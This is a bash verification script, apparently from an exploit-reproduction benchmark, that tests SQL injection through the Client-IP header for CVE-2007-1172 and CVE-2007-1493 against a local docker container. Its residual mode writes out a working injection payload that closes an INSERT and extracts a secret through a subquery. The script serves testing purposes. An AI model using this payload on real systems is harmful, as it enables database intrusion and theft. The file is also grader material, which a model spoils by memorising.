#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: CVE-2007-1172 Client-IP SQLi that does NOT start with a dotted-quad (poc/original_poc.py)
# residual: CVE-2007-1493 same INSERT, IP-prefixed (inline; never heldout)
# Judge the current RUN_FLAG in the HTTP body.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT="$(dc port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$APP_PORT" ]]; then
  echo "verify: cannot resolve ${VERSION}:80 (need --profile)" >&2
  exit 20
fi
export PCB_TARGET_PORT="$APP_PORT"

ready=0
for _ in $(seq 1 60); do
  if curl -fsS --max-time 5 "http://127.0.0.1:${APP_PORT}/" >/dev/null 2>&1; then
    ready=1; break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then echo "verify: ${VERSION} GET / timeout" >&2; exit 20; fi

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'header_name': 'Client-IP', 'header_value': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2007-1493 residual (inline, never heldout, never seed fallback):
  # same 14-column INSERT injection, but the Client-IP value STARTS with a dotted-quad
  # so V1's ^-anchored ereg accepts it; V2's ^...$ rejects the trailing SQL.
  "$PY" - <<'PY' > "$WORK_DIR/cand.json"
import json
print(json.dumps({
    "probe_id": "cve-2007-1493-ip-prefix",
    "header_name": "Client-IP",
    "header_value": "1.2.3.4','0','/','x','x','x',(SELECT secret FROM pcb_secret LIMIT 1),'x','x','x','x')-- -",
}))
PY
fi

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "verify: seed_exec failed" >&2; printf '%s\n' "$OUT" >&2; exit 20; }

BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    if isinstance(d, dict):
        print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
    else:
        print(d if isinstance(d, str) else json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
